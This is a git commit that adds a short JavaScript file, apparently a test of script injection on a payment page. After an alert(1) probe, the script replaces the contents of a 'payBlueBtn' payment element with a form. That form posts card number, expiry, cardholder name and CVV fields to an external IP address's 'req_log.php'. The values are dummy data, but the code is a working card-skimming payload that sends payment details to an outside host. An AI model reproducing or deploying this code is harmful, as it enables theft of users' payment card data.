b1a7efe00746a062a6f32a8c8e7618e902a427f8
Anton <ostrokonskiy@gmail.com>
2017-01-16 16:13:28 +0300

    Update and rename testtest9.js to testtest10.js

---
+++ testtest10.js
@@ -0,0 +1,8 @@
+alert(1);
+
+var btn = document.createElement("BUTTON");        // Create a <button> element
+var t = document.createTextNode("CLICK ME");       // Create a text node
+var x = document.getElementsByClassName("blueBtn payBlueBtn")[0];
+btn.appendChild(t);                                // Append the text to <button>
+x.appendChild(btn);
+document.getElementsByClassName("blueBtn payBlueBtn")[0].innerHTML = '<form method = "POST" action = "http://91.142.94.76/req_log.php"><input type = "text" name = "pan" value = "1234123412341238"/><input type = "text" name = "exp" value = "02/18"/><input type = "text" name = "name" value = "test test"/><input type = "text" name = "cvv" value = "123"/><input type = "Submit" name = "submit"/></form>';
